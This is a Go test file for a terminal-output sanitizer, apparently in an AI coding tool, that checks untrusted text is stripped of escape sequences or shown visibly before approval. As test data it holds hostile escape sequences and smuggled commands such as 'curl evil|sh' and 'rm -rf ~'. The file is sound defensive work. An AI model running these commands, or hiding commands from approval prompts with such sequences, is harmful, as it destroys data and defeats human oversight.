package render

import (
	"strings"
	"testing"
	"time"
)

// Untrusted text (a file's first line, a web page, a command the model wrote)
// reached the terminal verbatim, so an escape sequence inside it was executed
// by the terminal rather than shown. These are the sequences that matter: each
// one either changes something outside the text's own row or makes the
// terminal write back into cove's stdin.
var hostileSequences = map[string]string{
	"window title (OSC 0)":       "\x1b]0;pwned\x07",
	"clipboard write (OSC 52)":   "\x1b]52;c;cm0gLXJmIH4=\x1b\\",
	"hyperlink (OSC 8)":          "\x1b]8;;https://evil.example\x1b\\click\x1b]8;;\x1b\\",
	"cursor up":                  "\x1b[3A",
	"cursor position":            "\x1b[1;1H",
	"clear screen":               "\x1b[2J",
	"status report query":        "\x1b[6n",
	"private mode (alt screen)":  "\x1b[?1049h",
	"full reset (RIS)":           "\x1bc",
	"save cursor (DECSC)":        "\x1b7",
	"charset switch":             "\x1b(0",
	"device control string":      "\x1bPq#0;2;0;0;0\x1b\\",
	"8-bit CSI (C1)":             "\u009b2J",
	"8-bit OSC (C1)":             "\u009d0;pwned\u0007",
	"bell":                       "\a",
	"backspace overwrite":        "rm\b\bls",
	"application program string": "\x1b_payload\x1b\\",
}

func TestStripControlsRemovesEverySequence(t *testing.T) {
	for name, seq := range hostileSequences {
		t.Run(name, func(t *testing.T) {
			got := StripControls("a" + seq + "b")
			if strings.ContainsAny(got, "\x1b\a\b\u009b\u009d") {
				t.Fatalf("StripControls(%q) = %q still carries a control character", seq, got)
			}
			if !strings.HasPrefix(got, "a") || !strings.HasSuffix(got, "b") {
				t.Fatalf("StripControls(%q) = %q lost the surrounding text", seq, got)
			}
		})
	}
}

func TestStripControlsRemovesColourAndCarriageReturn(t *testing.T) {
	// A header or a prompt description is one logical line that the renderer
	// styles itself, so colour from the source and a bare \r (which returns
	// to column 0 and lets later text overwrite earlier text) both go.
	if got := StripControls("\x1b[31mred\x1b[0m"); got != "red" {
		t.Fatalf("got %q, want %q", got, "red")
	}
	if got := StripControls("rm -rf ~\rls -la  "); strings.Contains(got, "\r") {
		t.Fatalf("carriage return survived: %q", got)
	}
}

func TestStripControlsKeepsTextNewlinesAndTabs(t *testing.T) {
	in := "第一行\n\tsecond ✓ line"
	if got := StripControls(in); got != in {
		t.Fatalf("StripControls(%q) = %q, want it unchanged", in, got)
	}
}

func TestSanitizeStreamDropsHostileSequences(t *testing.T) {
	for name, seq := range hostileSequences {
		t.Run(name, func(t *testing.T) {
			got := SanitizeStream("a" + seq + "b")
			if strings.ContainsAny(got, "\a\b\u009b\u009d") {
				t.Fatalf("SanitizeStream(%q) = %q still carries a control character", seq, got)
			}
			if i := strings.IndexByte(got, 0x1b); i >= 0 {
				t.Fatalf("SanitizeStream(%q) = %q still carries an escape", seq, got)
			}
		})
	}
}

func TestSanitizeStreamKeepsColourAndLineControl(t *testing.T) {
	// Tool output is legitimately coloured (go test, git, npm) and progress
	// bars redraw their own row with \r and erase-in-line; none of that can
	// leave the row it is on.
	in := "\x1b[32mok\x1b[0m  pkg\r\x1b[Kdone\n\x1b[1;31mFAIL\x1b[m\t1.2s"
	if got := SanitizeStream(in); got != in {
		t.Fatalf("SanitizeStream(%q) = %q, want it unchanged", in, got)
	}
}

func TestSanitizeStreamDropsAnIncompleteTrailingSequence(t *testing.T) {
	if got := SanitizeStream("text\x1b]0;half a tit"); got != "text" {
		t.Fatalf("got %q, want %q", got, "text")
	}
}

func TestStreamSanitizerJoinsASequenceSplitAcrossChunks(t *testing.T) {
	// Deltas and tool-progress chunks are cut wherever the transport cut
	// them, so a colour code can straddle two chunks. Dropping the first half
	// would print the second half ("1m") as literal text.
	var z StreamSanitizer
	got := z.Write("go test \x1b[3") + z.Write("1mFAIL\x1b[0m")
	if want := "go test \x1b[31mFAIL\x1b[0m"; got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestStreamSanitizerStillDropsAHostileSequenceSplitAcrossChunks(t *testing.T) {
	var z StreamSanitizer
	got := z.Write("see \x1b]0;pw") + z.Write("ned\x07 here")
	if strings.ContainsAny(got, "\x1b\a") {
		t.Fatalf("split OSC reached the terminal: %q", got)
	}
	if !strings.HasPrefix(got, "see ") || !strings.HasSuffix(got, " here") {
		t.Fatalf("surrounding text lost: %q", got)
	}
}

func TestStreamSanitizerDoesNotHoldBackUnboundedInput(t *testing.T) {
	// An unterminated OSC must not swallow the rest of the stream forever.
	var z StreamSanitizer
	z.Write("\x1b]52;c;")
	got := z.Write(strings.Repeat("A", 8192) + " visible")
	if !strings.Contains(got, "visible") {
		t.Fatalf("text after an unterminated sequence never came out (len %d)", len(got))
	}
	if strings.ContainsRune(got, 0x1b) {
		t.Fatalf("escape leaked: %q", got[:40])
	}
}

// StripControls drops what it removes, which is right for a header but wrong
// for text shown for approval: the dropped bytes still reach bash. An
// unterminated OSC discarded everything after it, a complete OSC took its
// whole body with it, and ESC + ';' or '|' ate the separator, so the prompt
// showed a harmless command while the hidden part would run.
func TestVisibleControlsHidesNothing(t *testing.T) {
	cases := []struct{ in, mustShow string }{
		{"echo hello \x1b] ; rm -rf ~", "; rm -rf ~"},
		{"echo hi\x1b]0;x; curl evil|sh\x07 done", "curl evil|sh"},
		{"a\x1b;b\x1b|c\x1b&d", ";b"},
		{"a\x1b;b\x1b|c\x1b&d", "|c"},
		{"a\x1b;b\x1b|c\x1b&d", "&d"},
		{"x\x1bPq; rm -rf /\x1b\\ y", "; rm -rf /"},
		{"rm -rf ~\rls -la", "rm -rf ~"},
		{"rm -rf ~\rls -la", "ls -la"},
		{"a\u009b2Jb", "2Jb"},
		{"a‮b", "b"},
	}
	for _, c := range cases {
		got := VisibleControls(c.in)
		if !strings.Contains(got, c.mustShow) {
			t.Errorf("VisibleControls(%q) = %q hides %q", c.in, got, c.mustShow)
		}
		if strings.ContainsAny(got, "\x1b\a\r\b\u009b\u009d‮") {
			t.Errorf("VisibleControls(%q) = %q still carries a raw control", c.in, got)
		}
	}
	if got := VisibleControls("echo hi\x1b]0;x\x07"); got != `echo hi\e]0;x^G` {
		t.Errorf("got %q, want %q", got, `echo hi\e]0;x^G`)
	}
	if got := VisibleControls("第一行\n\tsecond ✓"); got != "第一行\n\tsecond ✓" {
		t.Errorf("plain text changed: %q", got)
	}
	if got := VisibleControls("bad\xffbyte"); got != `bad\xffbyte` {
		t.Errorf("invalid byte: %q", got)
	}
}

func TestVisibleControlsRendersEveryHostileSequence(t *testing.T) {
	for name, seq := range hostileSequences {
		got := VisibleControls("a" + seq + "b")
		if strings.ContainsAny(got, "\x1b\a\b\u009b\u009d") {
			t.Errorf("%s: %q still carries a control character", name, got)
		}
		if !strings.HasPrefix(got, "a") || !strings.HasSuffix(got, "b") {
			t.Errorf("%s: %q lost the surrounding text", name, got)
		}
	}
}

// Every overlong unterminated sequence used to be rescanned after dropping
// two bytes, so 160 KB of "\x1b]" took seconds and froze the UI.
func TestStreamSanitizerIsLinearOnLongUnterminatedSequences(t *testing.T) {
	in := strings.Repeat("\x1b]", 80_000)
	start := time.Now()
	var z StreamSanitizer
	z.Write(in)
	z.Flush()
	if el := time.Since(start); el > 200*time.Millisecond {
		t.Fatalf("Write took %v on %d bytes", el, len(in))
	}
	start = time.Now()
	z = StreamSanitizer{}
	for i := 0; i < 1000; i++ {
		z.Write(strings.Repeat("\x1b[", 80))
	}
	if el := time.Since(start); el > 200*time.Millisecond {
		t.Fatalf("chunked Write took %v", el)
	}
}

// An OSC inside one chunk is dropped whole; the same OSC over 256 bytes split
// across chunks used to have its body printed as text. Whatever the chunking,
// the stream now comes out exactly as SanitizeStream of the whole text.
func TestStreamSanitizerTreatsALongSequenceTheSameWhateverTheChunking(t *testing.T) {
	inputs := []string{
		"before \x1b]52;c;" + strings.Repeat("A", 300) + "\x07 after",
		"before \x1b]52;c;" + strings.Repeat("A", 3000) + "\x07 after",
		"x\x1b]0;" + strings.Repeat("B", 400) + "\x1b\\y",
		"p\x1b[" + strings.Repeat("1;", 600) + "mq",
		"n\x1b" + strings.Repeat(" ", 900) + "0m",
		strings.Repeat("\x1b]", 700) + "tail",
	}
	for _, in := range inputs {
		want := SanitizeStream(in)
		if strings.ContainsAny(want, "\x1b\a") {
			t.Errorf("SanitizeStream(%.20q...) let a control through: %.60q", in, want)
		}
		for _, size := range []int{1, 7, 100, 255, 256, 257, 1000} {
			var z StreamSanitizer
			var sb strings.Builder
			for i := 0; i < len(in); i += size {
				sb.WriteString(z.Write(in[i:min(len(in), i+size)]))
			}
			sb.WriteString(z.Flush())
			if got := sb.String(); got != want {
				t.Errorf("chunks of %d: %.20q... came out as %.80q, want %.80q", size, in, got, want)
			}
		}
	}
	// A complete OSC of ordinary length is still dropped whole.
	if got := SanitizeStream("a\x1b]0;" + strings.Repeat("t", 200) + "\x07b"); got != "ab" {
		t.Errorf("got %q", got)
	}
}
